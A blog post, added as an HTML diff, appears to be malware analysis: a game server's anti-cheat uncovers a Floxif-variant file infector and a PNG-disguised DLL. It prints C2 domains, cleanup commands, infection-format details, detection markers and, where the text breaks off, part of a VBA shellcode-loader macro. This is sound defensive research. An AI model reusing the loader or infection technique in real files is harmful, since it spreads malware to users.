@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Our Anti-Cheat Found a Virus Instead | abakidev - blog</title>
+<meta property="og:title" content="Our Anti-Cheat Found a Virus Instead | abakidev - blog" />
+<meta name="twitter:title" content="Our Anti-Cheat Found a Virus Instead | abakidev - blog" />
+<meta itemprop="name" content="Our Anti-Cheat Found a Virus Instead | abakidev - blog" />
+<meta name="application-name" content="Our Anti-Cheat Found a Virus Instead | abakidev - blog" />
+<meta property="og:site_name" content="abakidev - blog" />
+
+<meta name="description" content="We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all.">
+<meta itemprop="description" content="We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all." />
+<meta property="og:description" content="We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all." />
+<meta name="twitter:description" content="We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all." />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en-us" href="https://3r4y.github.io/posts/anticheatfoundavirus/" title="English" />
+
+
+<meta itemprop="image" content="https://3r4y.github.io/01-overlay-xor.png" />
+<meta property="og:image" content="https://3r4y.github.io/01-overlay-xor.png" />
+<meta name="twitter:image" content="https://3r4y.github.io/01-overlay-xor.png" />
+<meta name="twitter:image:src" content="https://3r4y.github.io/01-overlay-xor.png" />
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-10-16T09:00:00&#43;0300 />
+    <meta property="article:published_time" content=2026-10-16T09:00:00&#43;0300 />
+    <meta property="og:url" content="https://3r4y.github.io/posts/anticheatfoundavirus/" />
+
+    
+    <meta property="og:article:author" content="Eray" />
+    <meta property="article:author" content="Eray" />
+    <meta name="author" content="Eray" />
+    
+    
+
+    
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "Our Anti-Cheat Found a Virus Instead",
+        "author": {
+        "@type": "Person",
+        "name": "Eray"
+        },
+        "datePublished": "2026-10-16",
+        "description": "We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all.",
+        "wordCount":  3168 ,
+        "mainEntityOfPage": "https://3r4y.github.io/posts/anticheatfoundavirus/",
+        "dateModified": "2026-10-16",
+        "image": {
+        "@type": "ImageObject",
+        "url": "https://3r4y.github.io/01-overlay-xor.png"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "abakidev - blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.168.0">
+
+    
+    <meta property="og:url" content="https://3r4y.github.io/posts/anticheatfoundavirus/">
+	<meta property="og:site_name" content="abakidev - blog">
+	<meta property="og:title" content="Our Anti-Cheat Found a Virus Instead">
+	<meta property="og:description" content="We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all.">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-10-16T09:00:00+03:00">
+		<meta property="article:modified_time" content="2026-10-16T09:00:00+03:00">
+		<meta property="article:tag" content="Reverse-Engineering">
+		<meta property="article:tag" content="Anti-Cheat">
+		<meta property="article:tag" content="Malware">
+		<meta property="article:tag" content="Windows">
+		<meta property="og:image" content="https://3r4y.github.io/posts/anticheatfoundavirus/01-overlay-xor.png">
+
+
+    
+    
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="https://3r4y.github.io/posts/anticheatfoundavirus/01-overlay-xor.png">
+	<meta name="twitter:title" content="Our Anti-Cheat Found a Virus Instead">
+	<meta name="twitter:description" content="We wrote an anti-cheat for a small game server. The file it kept flagging turned out not to be a cheat at all.">
+
+
+    
+
+    <link rel="canonical" href="https://3r4y.github.io/posts/anticheatfoundavirus/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://3r4y.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-E6J27NYTV3"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-E6J27NYTV3');
+        }
+      </script>
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://3r4y.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Our Anti-Cheat Found a Virus Instead</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-10-16T09:00:00&#43;03:00" itemprop="datePublished"> 16 Oct 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p>We run a private server for an old football game. Like everyone in that position, we eventually had to write our own anti-cheat.</p>
+<p>One of our rules is boring and obvious:</p>
+<blockquote>
+<p><strong>The unmanifested-module rule</strong>: a module was loaded <strong>from our own install directory</strong> whose SHA-256 appears in none of the patch manifests we published.</p>
+</blockquote>
+<p>We ship every file. We know every hash. If something in <code>&lt;install dir&gt;</code> isn&rsquo;t on that list, somebody put it there.</p>
+<p>For weeks that rule fired on exactly one player. One finding, one file:</p>
+<pre tabindex="0"><code>unmanifested module in OUR INSTALL DIRECTORY:
+C:\Users\&lt;user&gt;\AppData\Local\Programs\&lt;game&gt;\bugtrap.dll
+(unsigned, i386, 355271 bytes, sha256 9c65e99fcb6933ca...)
+</code></pre><p><code>BugTrap.dll</code> is a crash-reporting library. We ship it. Ours is <strong>276,992 bytes</strong>, hash <code>ad0a3705…</code>, and that is what sits in every other install we have on record. His was <strong>355,271 bytes</strong>.</p>
+<p>Over three days his <code>bugtrap.dll</code> had <strong>five different hashes, and every single one was exactly 355,271 bytes.</strong></p>
+<p>Same size, different content, every run. That&rsquo;s polymorphism.</p>
+<p>A detection that says &ldquo;this file is weird&rdquo; is worth very little, though. You need the file, so we asked him for it, and he sent it.</p>
+<h2 id="what-was-actually-in-it">What was actually in it</h2>
+<p>The PE sections summed to exactly 276,992 bytes, our file. Then 78,279 bytes of something appended after the last section.</p>
+<p>Diffing against our clean copy gave three modified regions and nothing else:</p>
+<table>
+	<thead>
+			<tr>
+					<th>offset</th>
+					<th>what</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>0x188</code></td>
+					<td><code>DATA_DIRECTORY[5]</code> (the <strong>base relocation table</strong>) zeroed</td>
+			</tr>
+			<tr>
+					<td><code>0x1eed8</code></td>
+					<td><code>8b ff 55 8b ec</code> → <code>e9 93 2b ff ff</code></td>
+			</tr>
+			<tr>
+					<td><code>0xf849</code>–<code>0x11b11</code></td>
+					<td>8,905 bytes of injected code</td>
+			</tr>
+	</tbody>
+</table>
+<p><code>8b ff 55 8b ec</code> is <code>mov edi,edi; push ebp; mov ebp,esp</code>: the hot-patchable prologue Microsoft compilers emit. Five bytes, perfect for a <code>jmp rel32</code>. It now jumps straight into the injected block.</p>
+<p>The appended data starts <code>d9 0e 01 00</code>. That is a length: 69,337. Then <code>88 9f …</code>. XOR that with <code>0xC5</code>: <code>0x88^0xC5 = 'M'</code>, <code>0x9f^0xC5 = 'Z'</code>.</p>
+<p>There&rsquo;s a second executable hiding in there.</p>
+<p><img src="/posts/anticheatfoundavirus/01-overlay-xor.png" alt="The appended overlay, raw and XOR-decoded"></p>
+<p><em><code>overlay.bin</code> is the 78,279 bytes appended to the infected DLL.</em></p>
+<p>Decoded and unpacked (it&rsquo;s UPX&rsquo;d, 69,337 → 160,473 bytes), it claims to be <code>lpk.dll</code>, &ldquo;Microsoft® Windows® Operating System&rdquo;, &ldquo;LanguagePack&rdquo;, version <code>5.1.2600.5512</code>. It exports three functions: <strong><code>FloodFix</code></strong>, <strong><code>FloodFix2</code></strong>, <strong><code>crc32</code></strong>.</p>
+<p><code>crc32</code> is my favourite function I have ever reversed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="nf">test</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span>      <span class="no">done</span>          <span class="c1">; never taken
+</span></span></span><span class="line"><span class="cl"><span class="nf">push</span>    <span class="mi">0xEA60</span>        <span class="c1">; 60000 ms
+</span></span></span><span class="line"><span class="cl"><span class="nf">call</span>    <span class="no">Sleep</span>
+</span></span><span class="line"><span class="cl"><span class="nf">jmp</span>     <span class="no">loop</span>
+</span></span></code></pre></div><p>Call it and your thread sleeps forever, one minute at a time. It exists to waste your afternoon.</p>
+<p><img src="/posts/anticheatfoundavirus/02-crc32-decoy.png" alt="The crc32 export in full"></p>
+<p><em><code>0x1001c15c</code> is the IAT slot for <code>KERNEL32!Sleep</code>.</em></p>
+<p><code>FloodFix</code> is the real one. <code>VirtualProtect</code> the PE headers writable → write the base relocation directory at <code>nt+0xa0</code>/<code>nt+0xa4</code> → <code>VirtualProtect</code> the code section RWX → <code>WriteProcessMemory(-1, …)</code>.</p>
+<p>Writing to <strong>its own process</strong>. Restoring the relocation table it zeroed. This thing doesn&rsquo;t attack the game. It repairs the file it infected, in memory, so the host still runs.</p>
+<h2 id="reading-the-strings">Reading the strings</h2>
+<p>There weren&rsquo;t any. Not useful ones.</p>
+<p>Two tricks were in the way. The first is an anti-disassembly gadget: a pair of stubs that read their own return address, <strong>add to it</strong> and return through it, stepping over junk bytes that exist purely to desynchronise a linear disassembler. Point IDA at the entry and you get garbage.</p>
+<p>The second is string encryption. <code>plain[i] = ~(cipher[i] ^ key)</code>, key stored at byte 2 of each blob. And the blobs aren&rsquo;t in <code>.rdata</code>, they&rsquo;re built on the stack <strong>one byte at a time</strong> with <code>mov byte ptr [ebp-0x388], 0x8e</code> instructions. A strings dump finds nothing because at rest there is nothing.</p>
+<p>So we scanned the raw opcode patterns (<code>C6 85</code> and <code>C6 45</code>), reassembled every contiguous run and decrypted them. 62 strings. Then we widened it: zero-stores via <code>and byte ptr [...], 0</code>, decoding at every offset, the global blob table, the injected stub. That gave <strong>155</strong>.</p>
+<p>Here is roughly what came out:</p>
+<ul>
+<li><strong>Persistence</strong>: <code>AppInit_DLLs</code>, <code>LoadAppInit_DLLs</code>, <code>RequireSignedAppInit_DLLs</code>, <code>CreateServiceA/W</code>, <code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></li>
+<li><strong>Spreading</strong>: <code>[AutoRun]</code>, <code>autorun.inf</code>, <code>open=</code>, <code>shell\open\Command=</code>, <code>NoDriveTypeAutoRun</code>, <code>pagefile.pif</code></li>
+<li><strong>Hiding</strong>: <code>ShowSuperHidden</code>, <code>SuperHidden</code>, <code>SFCDisable</code></li>
+<li><strong>Killing security software</strong>: <code>360safe.exe</code>, <code>xuetr</code>, <code>antivir</code>, <code>TerminateProcess</code>, plus GBK strings for 安全卫士, 电脑管家, 急救箱, 瑞星, 微点, 费尔 (Chinese AV products)</li>
+<li><strong>Injection</strong>: <code>SeDebugPrivilege</code>, <code>CreateProcessInternalW</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, into <code>winlogon.exe</code>, <code>lsass.exe</code>, <code>csrss.exe</code>, <code>smss.exe</code>, <code>svchost.exe</code>, <code>userinit.exe</code>, <code>explorer.exe</code></li>
+<li><strong>Credential theft</strong>: <code>mstsc.exe</code>, <code>mstsc.exe.mui</code>, <code>CredReadW</code> (saved RDP logins)</li>
+<li><strong>Command and control</strong>: <code>http://www.aieov.com/</code>, <code>http://5isohu.com/</code>, a hard-coded fallback IP <code>174.139.10.194</code>, <code>ui.asp?</code>, <code>logo.gif</code>, <code>so.gif</code>, <code>setup.exe</code>, <code>update.exe</code></li>
+<li><strong>Cleanup</strong>: <code>cmd.exe /c rd /S /Q &quot;</code>, <code>cmd.exe /c del /F /Q &quot;</code></li>
+</ul>
+<p>Also <code>股票</code>, Chinese for &ldquo;stock&rdquo;. It infects any file whose name contains that word, regardless of extension. Somebody wanted trading software.</p>
+<p>It&rsquo;s a <strong>file infector</strong>, not a cheat, and it had eaten our game.</p>
+<p>On the same machine it had also eaten <code>d3dx9_42.dll</code> (1,892,184 → 1,970,463) and Adobe&rsquo;s <code>armsvc.exe</code> (81,088 → 159,367). Same delta both times: <strong>+78,279 bytes</strong>. That&rsquo;s how we knew it wasn&rsquo;t aimed at us. We were just a <code>.dll</code> in a folder it was allowed to touch.</p>
+<h2 id="the-constant-size">The constant size</h2>
+<p>The 78,279 bytes decompose exactly:</p>
+<pre tabindex="0"><code>  4  uint32  payload length (69,337)
+69,337  the UPX&#39;d payload, XOR 0xC5
+  4  uint32  stub length (8,905)
+ 8,905  the host&#39;s own displaced .text bytes, XOR 0xC5
+  5  the original entry-point bytes (8b ff 55 8b ec)
+ 24  six dwords, each stored as value+0x3A:
+     BASERELOC rva 0x46000, size 0x2244,
+     EP offset 0x1eed8, stub offset 0xf849,
+     stub rva 0x10449, original size 0x43a00
+──────
+78,279
+</code></pre><p>Every byte it overwrote, it kept. That&rsquo;s why <code>FloodFix</code> can put the host back together at runtime and why the size is always identical.</p>
+<p>So why did the hash change every run? Two reasons. The stub is placed at a <strong>random offset</strong> inside the code section (<code>srand(time(0))</code>, 30 attempts, rejecting anything near the entry point or a data directory). And the stub template contains <strong>47 four-byte placeholders</strong>, each in a slot that never executes, each filled with <code>rand()</code> bytes at infection time.</p>
+<p>We rebuilt the whole 355,271-byte file from our clean DLL plus those rules. It matched <code>9c65e99f…</code> byte for byte.</p>
+<h2 id="it-has-a-name">It has a name</h2>
+<p>All of it is described in <strong>Virus Bulletin, December 2012</strong>, by Raul Alvarez of Fortinet, in a paper called <a href="https://www.virusbulletin.com/virusbulletin/2012/12/compromised-library">&ldquo;Compromised library&rdquo;</a>. Everything we worked out over an afternoon:</p>
+<ul>
+<li>the five-byte entry-point jump, with the original bytes stashed in the virus body</li>
+<li>the drop to <code>C:\Program Files\Common Files\System\symsrv.dll</code></li>
+<li>the UPX&rsquo;d payload</li>
+<li>the <code>FloodFix</code> and <code>crc32</code> exports</li>
+<li>the sleep-loop decoy</li>
+<li><code>VirtualProtect</code> on the headers to restore the relocation table</li>
+<li>the extra byte after <code>RETN</code> to break disassemblers</li>
+<li>the PEB walk to find <code>GetProcAddress</code></li>
+<li>a mutex named <code>Global\SYS_E0A9138</code></li>
+</ul>
+<p>The family is <strong>Floxif</strong>. We re-derived a fourteen-year-old virus from scratch because nobody on our team had read that paper.</p>
+<p>Ours is a later variant, and the differences are small but real. 2012 used XOR <code>0x2A</code>, we have <code>0xC5</code>. 2012 restored 3,513 bytes of <code>.text</code>, we restore 8,905. 2012 had two exports, ours has three. 2012&rsquo;s mutex was <code>Global\SYS_E0A9138</code>; ours creates that <strong>and</strong> <code>Global\SYS_E0A9188</code>, which I can&rsquo;t find a public reference to anywhere.</p>
+<p>Read the prior art first. Then do the work anyway, because the prior art is fourteen years old and the thing has moved.</p>
+<h2 id="then-we-swept-the-fleet">Then we swept the fleet</h2>
+<p>Knowing what it looks like, the obvious question is how many other players have it.</p>
+<p>We had no good way to ask. The markers live in frames nobody had ever written a rule against; the object directory is collected on roughly every snapshot and consumed by exactly nothing. So we wrote throwaway scanners and inflated the entire retained corpus: <strong>2,085,535 snapshots, 31,606 accounts, ~2 billion object-directory rows</strong>, two weeks of telemetry, zero inflate or parse failures.</p>
+<p>Two infected accounts. Here are the base rates, because a marker without one is just a hunch:</p>
+<table>
+	<thead>
+			<tr>
+					<th>marker</th>
+					<th>accounts</th>
+					<th>false positives</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>object named <code>SYS_E0A9138</code></td>
+					<td>1 / 31,606</td>
+					<td>0</td>
+			</tr>
+			<tr>
+					<td>DNS cache contains <code>www.aieov.com</code></td>
+					<td>2 / 31,606</td>
+					<td>0</td>
+			</tr>
+			<tr>
+					<td><code>symsrv.dll</code> loaded as a module from <code>Common Files\System</code></td>
+					<td>2 / 31,606</td>
+					<td>0</td>
+			</tr>
+			<tr>
+					<td>payload digest <code>de055a89…</code></td>
+					<td>1 / 31,606</td>
+					<td>0</td>
+			</tr>
+			<tr>
+					<td>overlay size exactly 78,279</td>
+					<td>1 / 31,606</td>
+					<td>0</td>
+			</tr>
+			<tr>
+					<td><code>autorun.inf</code> present</td>
+					<td>33 / 31,606</td>
+					<td><strong>all 33</strong> (shell artefacts)</td>
+			</tr>
+			<tr>
+					<td>string <code>languagepack</code></td>
+					<td>8 / 31,606</td>
+					<td><strong>all 8</strong> (Lenovo speech packs)</td>
+			</tr>
+			<tr>
+					<td>bare string <code>symsrv.dll</code> anywhere</td>
+					<td>3 / 31,606</td>
+					<td>1 (a <code>.lnk</code> in recent files)</td>
+			</tr>
+	</tbody>
+</table>
+<p>The last three are why you measure. <code>autorun.inf</code> sounds like a brilliant worm indicator right up until it matches 33 ordinary machines and none of them carry any other marker.</p>
+<p>Every file-based method we had missed the second account completely: that player&rsquo;s client build sends no file digests and no object directory at all, so he has zero rows in our binaries table and an empty object list. Nothing about his files was ever collected. He was found by two things that have nothing to do with files: <code>www.aieov.com</code> sitting in his DNS cache, and <code>symsrv.dll</code> showing up in his loaded module list at exactly 196,608 bytes, which is the <code>SizeOfImage</code> of the payload we had just unpacked.</p>
+<p>His machine had resolved the C2 domain. That&rsquo;s a callback.</p>
+<p>We also could not tell which of his files are infected, and still can&rsquo;t, because his build never sent the data. That&rsquo;s a collection gap, not a clean bill of health.</p>
+<h2 id="the-second-one-which-was-worse">The second one, which was worse</h2>
+<p>While this was going on, that rule fired on a different player. Same rule, same wording. This time it was our <strong>main game executable</strong>: shipped at 18,376,704 bytes, his at <strong>19,732,992</strong>.</p>
+<p>My first pass on it was wrong, and it&rsquo;s worth saying why.</p>
+<p>I checked it for Floxif and found nothing. No <code>SYS_E0A9138</code>, no <code>FloodFix</code>, no <code>aieov</code>. The delta was +1,356,288, not +78,279. The overlay was zero bytes, and Floxif lives in the overlay. The entry point and import table were byte-identical to ours. The last section had grown from 12,288 bytes at entropy 4.3 to 1,368,576 at entropy 7.97 and been renamed <code>UPX1</code>. But it wasn&rsquo;t UPX-packed, and the readable strings in it were import names like <code>CryptDeriveKey</code> and <code>RegOpenKeyExW</code>.</p>
+<p>So I wrote it off: somebody dumped our protected executable, rebuilt its imports, repacked it. A reverser doing reverser things.</p>
+<p>I had searched for the wrong virus. This file had a different one in it, three layers down. The only reason we found it is that somebody had already peeled it in an earlier investigation and left the layers on disk.</p>
+<h3 id="layer-three-was-a-png">Layer three was a PNG</h3>
+<p>The innermost artefact is 527,360 bytes and starts with <code>89 50 4E 47 0D 0A 1A 0A</code>: the PNG magic number. Every tool that looks at it sees an image.</p>
+<p><img src="/posts/anticheatfoundavirus/03-png-is-a-dll.png" alt="Six bytes turn a PNG into a DLL"></p>
+<p><em><code>cmp -l</code> prints offsets 1-based and values in octal: <code>211 115</code> is <code>0x89</code> -&gt; <code>0x4d</code>.</em></p>
+<p>Change <strong>six bytes</strong> (offsets 0, 1, 60, 61, 280, 281) and you have a valid PE32 DLL, exporting one function, <code>_a@4</code>, with its compile timestamp zeroed. The <code>MZ</code>, the <code>e_lfanew</code> field and the <code>PE\0\0</code> signature had all been overwritten with PNG header bytes. That&rsquo;s the whole disguise.</p>
+<p>Its import names are encrypted too, with a 12-byte repeating XOR key: <code>05 00 02 01 01 02 09 06 09 06 08 01</code>. Decoded, they stop looking like a game cheat immediately:</p>
+<table>
+	<thead>
+			<tr>
+					<th>library</th>
+					<th>what it&rsquo;s for</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>WINHTTP.dll</code>: <code>WinHttpOpen</code>, <code>WinHttpConnect</code>, <code>WinHttpReadData</code></td>
+					<td>command and control</td>
+			</tr>
+			<tr>
+					<td><code>ADVAPI32.dll</code>: <code>OpenSCManagerW</code></td>
+					<td>installing a service</td>
+			</tr>
+			<tr>
+					<td><code>ntdll.dll</code>: <code>NtAdjustPrivilege</code></td>
+					<td>privilege escalation</td>
+			</tr>
+			<tr>
+					<td><code>MPR.dll</code>: <code>WNetCancelConnection</code>, <code>WNetCloseEnum</code></td>
+					<td>enumerating network shares</td>
+			</tr>
+			<tr>
+					<td><code>Secur32.dll</code>: <code>LsaGetLogonSessionData</code></td>
+					<td>harvesting logon sessions</td>
+			</tr>
+			<tr>
+					<td><code>KERNEL32.dll</code>: <code>IsDebuggerPresent</code>, <code>ProcessIdToSessionId</code></td>
+					<td>anti-analysis</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="and-inside-that-a-word-document">And inside that, a Word document</h3>
+<p>Sitting in the same blob is a VBA project: <code>ThisDocument</code> and <code>Module1</code>, with the Office type library references still in it. The macro does this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="k">For</span> <span class="k">Each</span> <span class="n">part</span> <span class="ow">In</span> <span class="err">%</span><span class="n">slf</span><span class="err">%</span><span class="p">.</span><span class="n">CustomXMLParts</span>
+</span></span><span class="line"><span class="cl">  <span class="k">If</span> <span class="n">InStr</span><span class="p">(</span><span class="n">part</span><span class="p">.</span><span class="n">XML</span><span class="p">,</span> <span class="s">&#34;&lt;%vn%&gt;&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">0</span> <span class="k">Then</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64</span> <span class="o">=</span> <span class="n">Mid</span><span class="p">(</span><span class="n">part</span><span class="p">.</span><span class="n">XML</span><span class="p">,</span> <span class="n">InStr</span><span class="p">(</span><span class="n">part</span><span class="p">.</span><span class="n">XML</span><span class="p">,</span> <span class="s">&#34;&gt;&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64</span> <span class="o">=</span> <span class="n">Left</span><span class="p">(</span><span class="n">b64</span><span class="p">,</span> <span class="n">InStr</span><span class="p">(</span><span class="n">b64</span><span class="p">,</span> <span class="s">&#34;&lt;&#34;</span><span class="p">)</span> <span class="o">-</span> <span class="n">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Set</span> <span class="n">objNode</span> <span class="o">=</span> <span class="n">objXML</span><span class="p">.</span><span class="n">createElement</span><span class="p">(</span><span class="s">&#34;b64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">objNode</span><span class="p">.</span><span class="n">DataType</span> <span class="o">=</span> <span class="s">&#34;bin.base64&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">objNode</span><span class="p">.</span><span class="n">Text</span> <span class="o">=</span> <span class="n">b64</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Data</span> <span class="o">=</span> <span class="n">objNode</span><span class="p">.</span><span class="n">nodeTypedValue</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="ow">Or</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RtlMoveMemory</span> <span class="n">addr</span><span class="p">,</span> <span class="n">Data</span><span class="p">(</span><span class="n">0</span><span class="p">),</span> <span class="n">size</span>
+</span></span><span class="line"><span class="cl">    <span class="n">VirtualProtect</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="n">oldProtect</span>
